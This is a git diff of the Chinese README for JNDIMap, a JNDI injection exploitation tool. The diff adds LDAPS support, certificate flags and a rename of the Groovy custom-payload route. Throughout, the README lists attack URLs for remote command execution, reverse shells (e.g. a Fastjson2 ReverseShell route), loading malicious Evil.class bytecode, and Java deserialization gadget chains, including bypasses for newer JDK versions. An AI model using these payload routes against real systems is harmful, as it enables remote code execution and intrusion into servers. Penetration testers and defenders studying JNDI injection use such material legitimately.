@@ -2,7 +2,7 @@
 
 [English](README-en.md)
 
-JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI 和 LDAP 协议, 包含多种高版本 JDK 绕过方式
+JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI, LDAP 和 LDAPS 协议, 包含多种高版本 JDK 绕过方式
 
 目前支持以下功能
 
@@ -14,7 +14,7 @@ JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI 和 LDAP 协议, 包含多
 - Commons DBCP/Tomcat DBCP/Tomcat JDBC/Alibaba Druid/HikariCP JDBC RCE
 - NativeLibLoader 加载动态链接库
 - MLet 探测可用 Class
-- LDAP 反序列化
+- LDAP(s) 反序列化
 - 自定义 JNDI Payload (基于 Groovy 语言)
 
 ## Build
@@ -30,7 +30,7 @@ mvn package -Dmaven.test.skip=true
 ## Usage
 
 ```bash
-Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpPort>] [-u <url>] [-f <file>] [-useReferenceOnly] [-h]
+Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-s <ldapsPort>] [-p <httpPort>] [-j <jksPath>] [-k <jksPin>] [-u <url>] [-f <file>] [-useReferenceOnly] [-h]
 ````
 
 `-i`: 服务器监听 IP (即 codebase, 必须指定为一个目标可访问到的 IP, 例如 `192.168.1.100`, 不能用 `0.0.0.0`)
@@ -39,7 +39,13 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpP
 
 `-l`: LDAP 服务器监听端口, 默认为 `1389`
 
+`-s`: LDAPS 服务器监听端口, 默认为 `1636`
+
 `-p`: HTTP 服务器监听端口, 默认为 `3456`
+
+`-j`: LDAPS JKS 证书路径
+
+`-k`: LDAPS JKS 证书密码, 默认为空
 
 `-u`: 手动指定 JNDI 路由, 例如 `/Basic/Command/open -a Calculator` (某些场景的 JNDI URL 并不完全可控)
 
@@ -55,9 +61,11 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-p <httpP
 
 大部分参数均支持自动 Base64 URL 解码, 即可以直接传入明文 (命令/IP/端口/URL) 或 Base64 URL 编码后的内容 (部分路由只接受 Base64 URL 编码后的参数, 下文会特别注明)
 
-以下路由除 `/Deserialize/*` (LDAP 反序列化) 以外, 均支持 RMI 和 LDAP 协议
+以下路由除 `/Deserialize/*` (LDAP(s) 反序列化) 以外, 均支持 RMI, LDAP 和 LDAPS 协议
 
 对于 RMI 协议, 只需要将 `ldap://127.0.0.1:1389/` 替换为 `rmi://127.0.0.1:1099/` 即可
+
+对于 LDAPS 协议, 只需要将 `ldap://127.0.0.1:1389/` 替换为 `ldaps://127.0.0.1:1636/` 即可
 
 ### Basic
 
@@ -79,6 +87,7 @@ ldap://127.0.0.1:1389/Basic/Command/b3BlbiAtYSBDYWxjdWxhdG9y
 # URL 传参加载
 ldap://127.0.0.1:1389/Basic/FromUrl/<base64-url-encoded-java-bytecode>
 # 从运行 JNDIMap 的服务器上加载
+ldap://127.0.0.1:1389/Basic/FromFile/Evil.class # 相对于当前路径
 ldap://127.0.0.1:1389/Basic/FromFile/<base64-url-encoded-path-to-evil-class-file>
 
 # 原生反弹 Shell (支持 Windows)
@@ -322,7 +331,7 @@ Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>
 
 ### Deserialize
 
-通过 LDAP 协议触发 Java 原生反序列化, 不支持 RMI 协议
+通过 LDAP(s) 协议触发 Java 原生反序列化, 不支持 RMI 协议
 
 JNDIMap 内置以下利用链, 同时也支持自定义数据反序列化
 
@@ -337,6 +346,7 @@ JNDIMap 内置以下利用链, 同时也支持自定义数据反序列化
 # URL 传参加载
 ldap://127.0.0.1:1389/Deserialize/FromUrl/<base64-url-encoded-serialize-data>
 # 从运行 JNDIMap 的服务器上加载
+ldap://127.0.0.1:1389/Deserialize/FromFile/payload.ser # 相对于当前路径
 ldap://127.0.0.1:1389/Deserialize/FromFile/<base64-url-encoded-path-to-serialized-data>
 
 # CommonsCollectionsK1 反序列化 (3.1 + TemplatesImpl), 支持命令执行和反弹 Shell
@@ -380,11 +390,11 @@ ldap://127.0.0.1:1389/Deserialize/Fastjson2/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
 ```
 
-### Custom
+### Script
 
-JNDIMap 支持使用 [Groovy](https://groovy-lang.org/) 语言编写自定义 JNDI Payload
+JNDIMap 支持使用 [Groovy](https://groovy-lang.org/) 语言编写自定义 JNDI Payload 脚本
 
-Groovy 脚本 (以 H2 RCE 为例)
+以 H2 RCE 为例
 
 ```groovy
 import javax.naming.Reference
@@ -413,13 +423,13 @@ java -jar JNDIMap.jar -f /path/to/evil.groovy
 
 ```bash
 # 支持手动向 Groovy 脚本传入参数
-ldap://127.0.0.1:1389/Custom/<args>
+ldap://127.0.0.1:1389/Script/<args>
 ```
 
 如果在某些情况下, 无法完全控制 JNDI URL, 可以指定 `-u` 参数
 
 ```bash
-java -jar JNDIMap.jar -f /path/to/evil.groovy -u "/Custom/open -a Calculator"
+java -jar JNDIMap.jar -f /path/to/evil.groovy -u "/Script/open -a Calculator"
 ```
 
 然后通过任意 JNDI URL 触发
@@ -430,7 +440,7 @@ ldap://127.0.0.1:1389/x
 
 ### useReferenceOnly
 
-对于 LDAP 协议的 JNDI 注入, 如果想要利用 ObjectFactory 绕过, 目前已有的方法都是将 LDAP 协议返回的 javaSerializedData 属性设置为 Reference 对象的序列化数据
+对于 LDAP(s) 协议的 JNDI 注入, 如果想要利用 ObjectFactory 绕过, 目前已有的方法都是将 LDAP 协议返回的 javaSerializedData 属性设置为 Reference 对象的序列化数据
 
 但是自 JDK 21 开始 `com.sun.jndi.ldap.object.trustSerialData` 参数默认为 false, 即无法通过 LDAP 协议触发反序列化, 也就无法通过上面的方法解析 Reference 对象
 
@@ -483,3 +493,5 @@ java -jar JNDIMap.jar -useReferenceOnly
 [https://www.yulegeyu.com/2022/11/12/Java 安全攻防之老版本 Fastjson 的一些不出网利用/](https://www.yulegeyu.com/2022/11/12/Java%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E8%80%81%E7%89%88%E6%9C%ACFastjson-%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)
 
 [https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/](https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/)
+
+[https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html](https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html)
